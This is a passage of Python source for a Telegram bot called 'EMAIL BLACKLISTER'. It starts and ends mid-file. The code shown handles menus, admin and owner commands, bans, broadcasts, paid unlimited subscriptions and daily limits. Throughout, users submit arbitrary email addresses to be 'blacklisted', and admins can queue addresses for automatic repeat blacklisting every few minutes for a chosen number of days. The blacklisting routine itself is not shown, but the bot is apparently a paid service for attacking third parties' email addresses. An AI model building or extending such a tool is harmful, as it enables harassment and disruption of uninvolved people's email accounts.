async def autolog_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if user is None or user.id != OWNER_ID:
        await update.message.reply_text("⛔ <b>Only OWNER!</b>", parse_mode='HTML')
        return
    if not auto_emails_list:
        await update.message.reply_text("📋 <b>AUTO LOG</b>\n\n✨ No emails yet.", parse_mode='HTML')
        return

    by_admin = {}
    for e in auto_emails_list:
        info = auto_log.get(e, {})
        admin_name = info.get("by_name", "Unknown")
        admin_id = info.get("by_id", 0)
        admin_username = info.get("by_username", "N/A")
        key = f"{admin_name} (@{admin_username}) | ID: {admin_id}"
        by_admin.setdefault(key, []).append(e)

    text = f"📋 <b>AUTO LOG</b>\n\n📧 Total: <b>{len(auto_emails_list)}</b>\n"
    text += f"👥 Admins: <b>{len(by_admin)}</b>\n\n"

    for admin, emails in by_admin.items():
        text += f"👤 <b>{admin}</b>\n"
        text += f"   → {len(emails)} emails\n"
        for e in emails[:5]:
            days_left = get_email_days_left(e)
            custom_days = get_email_days(e)
            extra = f" ({days_left}/{custom_days}d)" if days_left is not None else ""
            text += f"   • <code>{e}</code>{extra}\n"
        if len(emails) > 5:
            text += f"   ... +{len(emails) - 5} more\n"
        text += "\n"

    if len(text) > 4000:
        text = text[:3900] + "\n\n... (truncated)"
    await update.message.reply_text(text, parse_mode='HTML')


# ==================== SUBSCRIPTION ====================
async def subscribe_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if user is None or user.id != OWNER_ID:
        await update.message.reply_text("⛔ <b>Only OWNER can use this!</b>", parse_mode='HTML')
        return
    if not context.args:
        await update.message.reply_text("💎 <b>SUBSCRIBE</b>\n\nUsage: <code>/subscribe &lt;user_id&gt;</code>", parse_mode='HTML')
        return
    try:
        target_id = int(context.args[0])
        success, msg = subscribe_user(target_id)
        if success:
            try:
                await context.bot.send_message(
                    chat_id=target_id,
                    text=f"💎 <b>SUBSCRIPTION ACTIVATED!</b>\n\n♾️ You now have UNLIMITED access!\n\nContact: {OWNER_USERNAME}",
                    parse_mode='HTML'
                )
            except Exception:
                pass
            await update.message.reply_text(f"✅ <b>{msg}</b>", parse_mode='HTML')
        else:
            await update.message.reply_text(f"❌ {msg}")
    except ValueError:
        await update.message.reply_text("❌ Invalid User ID!")


async def unsubscribe_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if user is None or user.id != OWNER_ID:
        await update.message.reply_text("⛔ <b>Only OWNER can use this!</b>", parse_mode='HTML')
        return
    if not context.args:
        await update.message.reply_text("❌ <b>UNSUBSCRIBE</b>\n\nUsage: <code>/unsubscribe &lt;user_id&gt;</code>", parse_mode='HTML')
        return
    try:
        target_id = int(context.args[0])
        success, msg = unsubscribe_user(target_id)
        if success:
            try:
                await context.bot.send_message(chat_id=target_id, text=f"❌ <b>SUBSCRIPTION REMOVED</b>\n\nContact: {OWNER_USERNAME}", parse_mode='HTML')
            except Exception:
                pass
            await update.message.reply_text(f"✅ <b>{msg}</b>", parse_mode='HTML')
        else:
            await update.message.reply_text(f"❌ {msg}")
    except ValueError:
        await update.message.reply_text("❌ Invalid User ID!")


async def checksub_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if user is None:
        return
    if context.args:
        if user.id != OWNER_ID:
            await update.message.reply_text("⛔ <b>Only OWNER!</b>", parse_mode='HTML')
            return
        try:
            target_id = int(context.args[0])
        except ValueError:
            await update.message.reply_text("❌ Invalid User ID!")
            return
    else:
        target_id = user.id

    is_sub = is_subscribed(target_id)
    is_adm = is_admin(target_id)

    if target_id == OWNER_ID:
        status = "👑 <b>OWNER</b> (Unlimited)"
    elif is_adm:
        status = "🛡️ <b>ADMIN</b> (Unlimited)"
    elif is_sub:
        status = "💎 <b>SUBSCRIBED</b> (Unlimited)"
    else:
        daily = get_user_blacklist_count(target_id)
        total = get_user_total_count(target_id)
        remaining = MAX_BLACKLIST_LIMIT - daily
        if remaining < 0:
            remaining = 0
        status = (f"👤 <b>NORMAL</b>\n\n"
                  f"📊 Today: <b>{daily}/{MAX_BLACKLIST_LIMIT}</b>\n"
                  f"📌 Remaining today: <b>{remaining}</b>\n"
                  f"🔁 Total ever: <b>{total}</b>")

    await update.message.reply_text(f"📊 <b>STATUS</b>\n\n🆔 User ID: <code>{target_id}</code>\n\n{status}", parse_mode='HTML')


async def sublist_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if user is None or user.id != OWNER_ID:
        await update.message.reply_text("⛔ <b>Only OWNER can use this command!</b>", parse_mode='HTML')
        return
    if not subscribers_list:
        await update.message.reply_text("💎 <b>SUBSCRIBERS LIST</b>\n\n✨ No subscribers yet.", parse_mode='HTML')
        return
    subs_text = "\n".join([f"• <code>{sid}</code>" for sid in subscribers_list])
    await update.message.reply_text(
        f"💎 <b>SUBSCRIBERS LIST</b>\n\n{subs_text}\n\n🔢 Total: <b>{len(subscribers_list)}</b>",
        parse_mode='HTML'
    )


# ==================== BROADCAST ====================
async def broadcast_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if user is None or user.id != OWNER_ID:
        await update.message.reply_text("⛔ <b>Only OWNER can use this command!</b>", parse_mode='HTML')
        return
    if not context.args:
        await update.message.reply_text("📢 <b>BROADCAST</b>\n\nUsage: <code>/broadcast &lt;message&gt;</code>", parse_mode='HTML')
        return
    broadcast_msg = ' '.join(context.args)
    keyboard = [
        [InlineKeyboardButton("✅ YES, SEND", callback_data='broadcast_yes')],
        [InlineKeyboardButton("❌ NO, CANCEL", callback_data='broadcast_no')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        f"📢 <b>BROADCAST PREVIEW</b>\n\n📝 Message:\n{broadcast_msg}\n\n"
        f"👥 Total Users: <b>{len(users_list)}</b>\n\n"
        f"⚠️ Send to ALL users?",
        reply_markup=reply_markup,
        parse_mode='HTML'
    )
    context.user_data['broadcast_msg'] = broadcast_msg


async def broadcast_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user = update.effective_user
    if user is None or user.id != OWNER_ID:
        await query.edit_message_text("⛔ <b>Only OWNER!</b>", parse_mode='HTML')
        return
    data = query.data
    broadcast_msg = context.user_data.get('broadcast_msg', '')
    if data == 'broadcast_yes':
        await query.edit_message_text("📢 <b>BROADCAST STARTED...</b>", parse_mode='HTML')
        success_count = 0
        fail_count = 0
        for user_data in users_list:
            if is_user_banned(user_data['id']):
                continue
            try:
                await context.bot.send_message(
                    chat_id=user_data['id'],
                    text=f"📢 <b>BROADCAST</b>\n\n{broadcast_msg}\n\n👑 From: {OWNER_USERNAME}",
                    parse_mode='HTML'
                )
                success_count += 1
                await asyncio.sleep(0.1)
            except Exception:
                fail_count += 1
        await query.edit_message_text(
            f"✅ <b>BROADCAST COMPLETE</b>\n\n"
            f"🟢 Sent: <b>{success_count}</b>\n"
            f"🔴 Failed: <b>{fail_count}</b>\n"
            f"📌 Total: <b>{len(users_list)}</b>",
            parse_mode='HTML'
        )
    elif data == 'broadcast_no':
        await query.edit_message_text("❌ <b>BROADCAST CANCELLED</b>", parse_mode='HTML')


# ==================== MENU ====================
def get_main_menu_keyboard(user_id):
    if user_id == OWNER_ID:
        keyboard = [
            [InlineKeyboardButton("🔥 BLACKLIST NOW ♾️", callback_data='blacklist')],
            [InlineKeyboardButton("📂 ADD AUTO EMAIL", callback_data='add_auto')],
            [InlineKeyboardButton("📁 VIEW AUTO LIST", callback_data='view_auto')],
            [InlineKeyboardButton("🗑️ REMOVE AUTO EMAILS", callback_data='remove_auto')],
            [InlineKeyboardButton("🧹 CLEAR AUTO LIST", callback_data='clear_auto')],
            [InlineKeyboardButton("⚙️ SET DAILY LIMIT", callback_data='setlimit_menu')],
            [InlineKeyboardButton("📢 BROADCAST", callback_data='broadcast')],
            [InlineKeyboardButton("👥 USERS", callback_data='users')],
            [InlineKeyboardButton("🚫 BAN USER", callback_data='ban')],
            [InlineKeyboardButton("✅ UNBAN USER", callback_data='unban')],
            [InlineKeyboardButton("📋 BANNED LIST", callback_data='bannedlist')],
            [InlineKeyboardButton("💎 SUBSCRIBERS", callback_data='sublist')],
            [InlineKeyboardButton("👑 ADMINS", callback_data='adminlist_menu')],
            [InlineKeyboardButton("📖 HELP & GUIDE", callback_data='help')],
            [InlineKeyboardButton("👤 OWNER", callback_data='owner')],
            [InlineKeyboardButton("📊 STATUS", callback_data='status')],
            [InlineKeyboardButton("❌ CANCEL", callback_data='cancel')]
        ]
    elif is_admin(user_id):
        keyboard = [
            [InlineKeyboardButton("🔥 BLACKLIST NOW ♾️", callback_data='blacklist')],
            [InlineKeyboardButton("💎 MY ACCESS - UNLIMITED", callback_data='mylimit')],
            [InlineKeyboardButton("📂 ADD AUTO EMAIL", callback_data='add_auto')],
            [InlineKeyboardButton("📖 HELP & GUIDE", callback_data='help')],
            [InlineKeyboardButton("👤 OWNER", callback_data='owner')],
            [InlineKeyboardButton("📊 STATUS", callback_data='status')],
            [InlineKeyboardButton("❌ CANCEL", callback_data='cancel')]
        ]
    elif is_subscribed(user_id):
        keyboard = [
            [InlineKeyboardButton("🔥 BLACKLIST NOW ♾️", callback_data='blacklist')],
            [InlineKeyboardButton("💎 SUBSCRIBED - UNLIMITED", callback_data='mylimit')],
            [InlineKeyboardButton("📖 HELP & GUIDE", callback_data='help')],
            [InlineKeyboardButton("👤 OWNER", callback_data='owner')],
            [InlineKeyboardButton("📊 STATUS", callback_data='status')],
            [InlineKeyboardButton("❌ CANCEL", callback_data='cancel')]
        ]
    else:
        count = get_user_blacklist_count(user_id)
        keyboard = [
            [InlineKeyboardButton("🔥 BLACKLIST NOW", callback_data='blacklist')],
            [InlineKeyboardButton(f"📊 TODAY: {count}/{MAX_BLACKLIST_LIMIT}", callback_data='mylimit')],
            [InlineKeyboardButton("📖 HELP & GUIDE", callback_data='help')],
            [InlineKeyboardButton("👤 OWNER", callback_data='owner')],
            [InlineKeyboardButton("📊 STATUS", callback_data='status')],
            [InlineKeyboardButton("❌ CANCEL", callback_data='cancel')]
        ]
    return InlineKeyboardMarkup(keyboard)


# ==================== START ====================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user = update.effective_user
        if user is None:
            return
        user_id = user.id
        if is_user_banned(user_id):
            await update.message.reply_text(f"🚫 <b>YOU ARE BANNED!</b>\n\nContact: {OWNER_USERNAME}", parse_mode='HTML')
            return
        user_states[user_id] = "idle"
        is_new = is_new_user(user_id)
        add_user(user_id, user.username, user.full_name)
        is_member = await check_channel_membership(context, user_id)
        if user_id != OWNER_ID and not is_member:
            await send_force_channel_message(update, context)
            return
        if is_new and user_id != OWNER_ID:
            await notify_owner_new_user(context, user, is_member)
        reply_markup = get_main_menu_keyboard(user_id)

        if user_id == OWNER_ID:
            welcome_text = (f"✨🌟 <b>EMAIL BLACKLISTER</b> 🌟✨\n\n"
                            f"👑 Welcome <b>{user.full_name or 'User'}</b>! (OWNER)\n\n"
                            f"🎯 Auto: Every {AUTO_INTERVAL_MINUTES} min\n"
                            f"⏰ Default Days: <b>{AUTO_EMAIL_DAYS}</b>\n"
                            f"📊 Daily Limit: <b>{MAX_BLACKLIST_LIMIT}</b>/user\n"
                            f"🛡️ Admins: <b>{len(admins_list) + 1}</b>\n\n"
                            f"👑 Owner: {OWNER_USERNAME}")
        elif is_admin(user_id):
            welcome_text = (f"✨🌟 <b>EMAIL BLACKLISTER</b> 🌟✨\n\n"
                            f"🛡️ Welcome <b>{user.full_name or 'User'}</b>! (ADMIN)\n\n"
                            f"♾️ <b>Unlimited Access</b>\n\n"
                            f"👑 Owner: {OWNER_USERNAME}")
        elif is_subscribed(user_id):
            welcome_text = (f"✨🌟 <b>EMAIL BLACKLISTER</b> 🌟✨\n\n"
                            f"💎 Welcome <b>{user.full_name or 'User'}</b>! (SUBSCRIBED)\n\n"
                            f"♾️ <b>Unlimited Access</b>\n\n"
                            f"👑 Owner: {OWNER_USERNAME}")
        else:
            count = get_user_blacklist_count(user_id)
            remaining = MAX_BLACKLIST_LIMIT - count
            if remaining < 0:
                remaining = 0
            welcome_text = (f"✨🌟 <b>EMAIL BLACKLISTER</b> 🌟✨\n\n"
                            f"👋 Welcome <b>{user.full_name or 'User'}</b>!\n\n"
                            f"📊 Today: <b>{count}/{MAX_BLACKLIST_LIMIT}</b>\n"
                            f"📌 Remaining today: <b>{remaining}</b>\n\n"
                            f"💎 Unlimited? Contact: {OWNER_USERNAME}")

        await update.message.reply_text(welcome_text, reply_markup=reply_markup, parse_mode='HTML')
    except Exception as e:
        print(f"{R}[!] Error in start: {e}{S}", flush=True)


# ==================== BUTTON CALLBACK ====================
async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        await query.answer()
        user = update.effective_user
        if user is None:
            await query.edit_message_text("❌ Error")
            return
        user_id = user.id
        if is_user_banned(user_id):
            await query.edit_message_text("🚫 <b>YOU ARE BANNED!</b>", parse_mode='HTML')
            return
        data = query.data
        if user_id != OWNER_ID:
            is_member = await check_channel_membership(context, user_id)
            if not is_member:
                await send_force_channel_message_update(query)
                return

        if data == 'blacklist':
            if not has_unlimited_access(user_id):
                count = get_user_blacklist_count(user_id)
                if count >= MAX_BLACKLIST_LIMIT:
                    await query.edit_message_text(
                        f"❌ <b>DAILY LIMIT REACHED!</b>\n\n"
                        f"📊 You have used <b>{count}/{MAX_BLACKLIST_LIMIT}</b> today.\n\n"
                        f"🕛 Resets at <b>12:00 AM IST</b>\n\n"
                        f"💎 Unlimited? {OWNER_USERNAME}",
                        parse_mode='HTML'
                    )
                    return
            user_states[user_id] = "awaiting_email"
            reply_markup = InlineKeyboardMarkup([[InlineKeyboardButton("❌ CANCEL", callback_data='cancel')]])
            await query.edit_message_text(
                f"📧 <b>ENTER EMAIL</b>\n\n"
                f"Example: <code>user@example.com</code>\n\n"
                f"⚠️ Only one valid email.",
                reply_markup=reply_markup,
                parse_mode='HTML'
            )

        elif data == 'mylimit':
            if user_id == OWNER_ID:
                await query.edit_message_text(
                    f"💎 <b>YOUR ACCESS</b>\n\n👑 <b>OWNER - UNLIMITED!</b>",
                    parse_mode='HTML'
                )
            elif is_admin(user_id):
                await query.edit_message_text(
                    f"💎 <b>YOUR ACCESS</b>\n\n"
                    f"🛡️ <b>ADMIN - UNLIMITED!</b>\n\n"
                    f"📊 Daily limit for normal users: <b>{MAX_BLACKLIST_LIMIT}</b>",
                    parse_mode='HTML'
                )
            elif is_subscribed(user_id):
                await query.edit_message_text(
                    f"💎 <b>YOUR ACCESS</b>\n\n"
                    f"💎 <b>SUBSCRIBED - UNLIMITED!</b>\n\n"
                    f"📊 Daily limit for normal users: <b>{MAX_BLACKLIST_LIMIT}</b>",
                    parse_mode='HTML'
                )
            else:
                count = get_user_blacklist_count(user_id)
                remaining = MAX_BLACKLIST_LIMIT - count
                if remaining < 0:
                    remaining = 0
                await query.edit_message_text(
                    f"📊 <b>YOUR DAILY LIMIT</b>\n\n"
                    f"✅ Today: <b>{count}/{MAX_BLACKLIST_LIMIT}</b>\n"
                    f"📌 Remaining today: <b>{remaining}</b>\n\n"
                    f"🕛 Resets at <b>12:00 AM IST</b>\n\n"
                    f"💎 Unlimited? {OWNER_USERNAME}",
                    parse_mode='HTML'
                )

        elif data == 'setlimit_menu':
            if user_id != OWNER_ID:
                await query.edit_message_text("⛔ Only OWNER!")
                return
            user_states[user_id] = "awaiting_setlimit"
            reply_markup = InlineKeyboardMarkup([[InlineKeyboardButton("❌ CANCEL", callback_data='cancel')]])
            await query.edit_message_text(
                f"⚙️ <b>SET DAILY LIMIT</b>\n\n"
                f"Current: <b>{MAX_BLACKLIST_LIMIT}</b> per user per day\n\n"
                f"Send the new daily limit number (e.g. <code>2</code>).",
                reply_markup=reply_markup,
                parse_mode='HTML'
            )

        elif data == 'add_auto':
            if not is_admin(user_id):
                await query.edit_message_text("⛔ Only admins!")
                return
            user_states[user_id] = "awaiting_auto_email"
            reply_markup = InlineKeyboardMarkup([[InlineKeyboardButton("❌ CANCEL", callback_data='cancel')]])
            await query.edit_message_text(
                f"📂 <b>ADD AUTO EMAILS</b>\n\n"
                f"♾️ <b>No limit for admins!</b>\n\n"
                f"<b>Step 1:</b> Send email(s):\n"
                f"• Single: <code>user@x.com</code>\n"
                f"• Multiple: <code>a@x.com, b@x.com</code>\n\n"
                f"<b>Step 2:</b> Bot poochega kitne din ke liye.\n\n"
                f"⚠️ Owner will be notified.",
                reply_markup=reply_markup,
                parse_mode='HTML'
            )

        elif data == 'remove_auto':
            if user_id != OWNER_ID:
                await query.edit_message_text("⛔ Only OWNER!")
                return
            user_states[user_id] = "awaiting_remove_email"
            reply_markup = InlineKeyboardMarkup([[InlineKeyboardButton("❌ CANCEL", callback_data='cancel')]])
            await query.edit_message_text(
                f"🗑️ <b>REMOVE AUTO EMAILS</b>\n\n"
                f"Send email(s) to remove.\n\n"
                f"Example: <code>a@x.com, b@x.com</code>",
                reply_markup=reply_markup,
                parse_mode='HTML'
            )

        elif data == 'view_auto':
            if user_id != OWNER_ID:
                await query.edit_message_text("⛔ Only OWNER!")
                return
            if auto_emails_list:
                lines = []
                for e in auto_emails_list:
                    info = auto_log.get(e, {})
                    by = info.get("by_name", "Unknown")
                    at = info.get("at", "")
                    days_left = get_email_days_left(e)
                    custom_days = get_email_days(e)
                    if at:
                        date_short = at.split(' ')[0]
                        extra = f" | ⏰ {days_left}/{custom_days}d" if days_left is not None else ""
                        lines.append(f"• <code>{e}</code>\n   └ by {by} ({date_short}){extra}")
                    else:
                        lines.append(f"• <code>{e}</code>")
                email_list = "\n".join(lines)
                text = (f"📁 <b>AUTO LIST</b>\n\n"
                        f"🔢 Total: <b>{len(auto_emails_list)}</b>\n\n"
                        f"{email_list}")
            else:
                text = "📁 <b>AUTO LIST</b>\n\n✨ No emails."
            reply_markup = InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data='back')]])
            if len(text) > 4000:
                text = text[:3900] + "\n\n... (truncated)"
            await query.edit_message_text(text, reply_markup=reply_markup, parse_mode='HTML')

        elif data == 'clear_auto':
            if user_id != OWNER_ID:
                await query.edit_message_text("⛔ <b>Only OWNER!</b>", parse_mode='HTML')
                return
            count_before = len(auto_emails_list)
            auto_emails_list.clear()
            auto_log.clear()
            save_auto_emails()
            save_auto_log()
            reply_markup = InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data='back')]])
            await query.edit_message_text(f"🗑️ <b>CLEARED!</b>\n\n❌ Removed {count_before} emails.", reply_markup=reply_markup, parse_mode='HTML')

        elif data == 'broadcast':
            if user_id != OWNER_ID:
                await query.edit_message_text("⛔ Only OWNER!")
                return
            await query.edit_message_text(f"📢 <b>BROADCAST</b>\n\nUsage: <code>/broadcast &lt;message&gt;</code>\n\n👥 Users: <b>{len(users_list)}</b>", parse_mode='HTML')

        elif data == 'users':
            if user_id != OWNER_ID:
                await query.edit_message_text("⛔ Only OWNER!")
                return
            if not users_list:
                await query.edit_message_text("📊 No users.")
                return
            user_text = "\n".join([
                f"• {u['name']} (@{u['username']}) - today: {u.get('daily_count', 0)}/{MAX_BLACKLIST_LIMIT} | total: {u.get('blacklist_count', 0)}"
                for u in users_list[-10:]
            ])
            await query.edit_message_text(f"👥 <b>USERS ({len(users_list)})</b>\n\n{user_text}", parse_mode='HTML')

        elif data == 'ban':
            if user_id != OWNER_ID:
                await query.edit_message_text("⛔ Only OWNER!")
                return
            await query.edit_message_text("🚫 <b>Usage:</b> <code>/ban &lt;user_id&gt;</code>", parse_mode='HTML')

        elif data == 'unban':
            if user_id != OWNER_ID:
                await query.edit_message_text("⛔ Only OWNER!")
                return
            await query.edit_message_text("✅ <b>Usage:</b> <code>/unban &lt;user_id&gt;</code>", parse_mode='HTML')

        elif data == 'bannedlist':
            if user_id != OWNER_ID:
                await query.edit_message_text("⛔ Only OWNER!")
                return
            if not banned_users_list:
                await query.edit_message_text("📋 No banned users.")
                return
            banned_text = "\n".join([f"• <code>{uid}</code>" for uid in banned_users_list])
            await query.edit_message_text(f"📋 <b>BANNED ({len(banned_users_list)})</b>\n\n{banned_text}", parse_mode='HTML')

        elif data == 'sublist':
            if user_id != OWNER_ID:
                await query.edit_message_text("⛔ Only OWNER!")
                return
            if not subscribers_list:
                await query.edit_message_text("💎 No subscribers.")
                return
            subs_text = "\n".join([f"• <code>{sid}</code>" for sid in subscribers_list])
            await query.edit_message_text(f"💎 <b>SUBSCRIBERS ({len(subscribers_list)})</b>\n\n{subs_text}", parse_mode='HTML')

        elif data == 'adminlist_menu':
            if user_id != OWNER_ID:
                await query.edit_message_text("⛔ Only OWNER!")
                return
            if not admins_list:
                text = (f"👑 <b>ADMIN LIST</b>\n\n✨ No admins yet.\n\n"
                        f"👑 Owner: <code>{OWNER_ID}</code>\n\n"
                        f"Add: <code>/addadmin &lt;user_id&gt;</code>")
            else:
                admin_text = "\n".join([f"• <code>{uid}</code>" for uid in admins_list])
                text = (f"👑 <b>ADMIN LIST</b>\n\n"
                        f"👑 OWNER: <code>{OWNER_ID}</code>\n\n"
                        f"🛡️ ADMINS:\n{admin_text}\n\n"
                        f"🔢 Total: <b>{len(admins_list)}</b>")
            reply_markup = InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data='back')]])
            await query.edit_message_text(text, reply_markup=reply_markup, parse_mode='HTML')

        elif data == 'help':
            help_text = (f"📖 <b>HELP & GUIDE</b>\n\n"
                         f"1️⃣ Click <b>BLACKLIST NOW</b>\n"
                         f"2️⃣ Enter Email\n"
                         f"3️⃣ Wait\n"
                         f"4️⃣ Get Result\n\n"
                         f"📊 <b>Daily Limit:</b> {MAX_BLACKLIST_LIMIT} per user\n"
                         f"🕛 Resets at <b>12:00 AM IST</b>\n\n"
                         f"💎 <b>Unlimited?</b> {OWNER_USERNAME}\n\n"
                         f"⏰ Auto: Every {AUTO_INTERVAL_MINUTES} min\n"
                         f"⏳ Default Expire: {AUTO_EMAIL_DAYS} days\n\n"
                         f"👑 Owner: {OWNER_USERNAME}")
            reply_markup = InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data='back')]])
            await query.edit_message_text(help_text, reply_markup=reply_markup, parse_mode='HTML')

        elif data == 'owner':
            owner_text = (f"👑 <b>OWNER</b>\n\n"
                          f"{OWNER_USERNAME}\n\n"
                          f"🔥 <b>Services:</b>\n"
                          f"• Email Blacklisting\n"
                          f"• Auto Blacklist\n"
                          f"• Unlimited Subscription\n"
                          f"• Fast Processing\n\n"
                          f"💬 24/7 Support")
            reply_markup = InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data='back')]])
            await query.edit_message_text(owner_text, reply_markup=reply_markup, parse_mode='HTML')

        elif data == 'status':
            total_users = len(users_list)
            total_blacklists = sum(u.get('blacklist_count', 0) for u in users_list)
            status_text = (f"📊 <b>BOT STATUS</b>\n\n"
                           f"🟢 Status: <b>ONLINE</b>\n"
                           f"⚡ Workers: <b>{NUM_WORKERS}</b>\n"
                           f"👥 Users: <b>{total_users}</b>\n"
                           f"🔥 Blacklists: <b>{total_blacklists}</b>\n"
                           f"📊 Daily Limit: <b>{MAX_BLACKLIST_LIMIT}</b>/user\n"
                           f"📁 Auto List: <b>{len(auto_emails_list)}</b>\n"
                           f"⏰ Default Days: <b>{AUTO_EMAIL_DAYS}</b>\n"
                           f"⏱️ Auto Interval: {AUTO_INTERVAL_MINUTES} min\n"
                           f"🎯 Attempts: <b>{total_attempts_ever}</b>\n"
                           f"🚫 Banned: <b>{len(banned_users_list)}</b>\n"
                           f"💎 Subscribers: <b>{len(subscribers_list)}</b>\n"
                           f"🛡️ Admins: <b>{len(admins_list) + 1}</b>\n\n"
                           f"👑 Owner: {OWNER_USERNAME}")
            reply_markup = InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data='back')]])
            await query.edit_message_text(status_text, reply_markup=reply_markup, parse_mode='HTML')

        elif data == 'check_join':
            is_member = await check_channel_membership(context, user_id)
            if is_member:
                if OWNER_ID and user_id != OWNER_ID:
                    try:
                        await context.bot.send_message(
                            chat_id=OWNER_ID,
                            text=(f"📢 <b>CHANNEL JOINED</b>\n\n"
                                  f"👤 {user.full_name or 'Unknown'}\n"
                                  f"🔗 @{user.username or 'N/A'}\n"
                                  f"🆔 <code>{user_id}</code>\n"
                                  f"🕒 {datetime.now().strftime('%I:%M %p, %d-%m-%Y')}"),
                            parse_mode='HTML'
                        )
                    except Exception:
                        pass
                reply_markup = get_main_menu_keyboard(user_id)
                await query.edit_message_text("✅ <b>VERIFIED!</b>\n\nChoose an option:", reply_markup=reply_markup, parse_mode='HTML')
            else:
                keyboard = [
                    [InlineKeyboardButton("📢 JOIN CHANNEL", url=FORCE_CHANNEL_LINK)],
                    [InlineKeyboardButton("✅ I HAVE JOINED", callback_data='check_join')]
                ]
                reply_markup = InlineKeyboardMarkup(keyboard)
                await query.edit_message_text(f"❌ <b>NOT VERIFIED!</b>\n\nJoin: @Adityaapis_570", reply_markup=reply_markup, parse_mode='HTML')

        elif data == 'cancel':
            user_states[user_id] = "idle"
            context.user_data.pop('pending_auto_emails', None)
            reply_markup = get_main_menu_keyboard(user_id)
            await query.edit_message_text("❌ <b>CANCELLED</b>", reply_markup=reply_markup, parse_mode='HTML')

        elif data == 'back':
            reply_markup = get_main_menu_keyboard(user_id)
            await query.edit_message_text("✨ <b>MAIN MENU</b> ✨\n\nChoose:", reply_markup=reply_markup, parse_mode='HTML')

        elif data == 'broadcast_yes' or data == 'broadcast_no':
            await broadcast_callback(update, context)

    except Exception as e:
        print(f"{R}[!] Error in button_callback: {e}{S}", flush=True)


# ==================== MESSAGE HANDLER ====================
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user = update.effective_user
        if user is None:
            return
        user_id = user.id
        if is_user_banned(user_id):
            await update.message.reply_text("🚫 <b>YOU ARE BANNED!</b>", parse_mode='HTML')
            return
        message_text = update.message.text.strip()
        if user_id != OWNER_ID:
            is_member = await check_channel_membership(context, user_id)
            if not is_member:
                await send_force_channel_message(update, context)
                return

        # ---------- OWNER: Setlimit flow ----------
        if user_states.get(user_id) == "awaiting_setlimit" and user_id == OWNER_ID:
            try:
                new_limit = int(message_text.strip())
            except ValueError:
                reply_markup = InlineKeyboardMarkup([[InlineKeyboardButton("❌ CANCEL", callback_data='cancel')]])
                await update.message.reply_text("❌ Invalid number!", reply_markup=reply_markup)
                return
            success, msg = set_max_limit(new_limit)
            user_states[user_id] = "idle"
            reply_markup = get_main_menu_keyboard(user_id)
            if success:
                await update.message.reply_text(f"✅ <b>UPDATED</b>\n\n{msg}", reply_markup=reply_markup, parse_mode='HTML')
            else:
                await update.message.reply_text(f"❌ {msg}", reply_markup=reply_markup)
            return

        # ---------- OWNER: Remove auto emails flow ----------
        if user_states.get(user_id) == "awaiting_remove_email" and user_id == OWNER_ID:
            emails = [e.strip() for e in message_text.split(',')]
            removed = []
            not_found = []
            for email in emails:
                if email in auto_emails_list:
                    auto_emails_list.remove(email)
                    removed.append(email)
                    if email in auto_log:
                        del auto_log[email]
                else:
                    not_found.append(email)
            save_auto_emails()
            save_auto_log()

            reply_markup = InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data='back')]])
            response = (f"🗑️ <b>REMOVED</b>\n\n"
                        f"🟢 Removed: <b>{len(removed)}</b>\n"
                        f"🔴 Not Found: <b>{len(not_found)}</b>\n"
                        f"📊 Total: <b>{len(auto_emails_list)}</b>")
            if removed:
                response += "\n\n" + "\n".join([f"• <code>{e}</code>" for e in removed])
            user_states[user_id] = "idle"
            await update.message.reply_text(response, reply_markup=reply_markup, parse_mode='HTML')
            return

        # ---------- ADMIN/OWNER: Add auto emails flow (Step 1: emails) ----------
        if user_states.get(user_id) == "awaiting_auto_email" and is_admin(user_id):
            emails = [e.strip() for e in message_text.split(',')]
            # Validate emails
            valid = []
            invalid = []
            for email in emails:
                if not email:
                    continue
                if is_valid_email(email):
                    if email not in auto_emails_list:
                        valid.append(email)
                    else:
                        invalid.append(f"{email} (already exists)")
                else:
                    invalid.append(f"{email} (invalid)")

            if not valid:
                reply_markup = InlineKeyboardMarkup([[InlineKeyboardButton("❌ CANCEL", callback_data='cancel')]])
                await update.message.reply_text(
                    f"❌ <b>No valid emails found</b>\n\n"
                    f"<b>Failed:</b>\n" + "\n".join([f"• <code>{e}</code>" for e in invalid]),
                    reply_markup=reply_markup,
                    parse_mode='HTML'
                )
                return

            # Store valid emails in user_data, ask for days
            context.user_data['pending_auto_emails'] = valid
            user_states[user_id] = "awaiting_auto_days"
            reply_markup = InlineKeyboardMarkup([
                [InlineKeyboardButton(f"⏰ {AUTO_EMAIL_DAYS} days (default)", callback_data='auto_days_default')],
                [InlineKeyboardButton("❌ CANCEL", callback_data='cancel')]
            ])
            msg = (f"✅ <b>{len(valid)} valid email(s) detected</b>\n\n")
            if invalid:
                msg += f"⚠️ <b>Skipped:</b>\n" + "\n".join([f"• <code>{e}</code>" for e in invalid]) + "\n\n"
            msg += (f"<b>Ab kitne din tak auto blacklist karna hai?</b>\n\n"
                    f"📝 <b>Number bhejo</b> (e.g. <code>5</code>) — ya default use karo:")
            await update.message.reply_text(msg, reply_markup=reply_markup, parse_mode='HTML')
            return

        # ---------- ADMIN/OWNER: Add auto emails flow (Step 2: days) ----------
        if user_states.get(user_id) == "awaiting_auto_days" and is_admin(user_id):
            try:
                days = int(message_text.strip())
            except ValueError:
                reply_markup = InlineKeyboardMarkup([
                    [InlineKeyboardButton(f"⏰ {AUTO_EMAIL_DAYS} days (default)", callback_data='auto_days_default')],
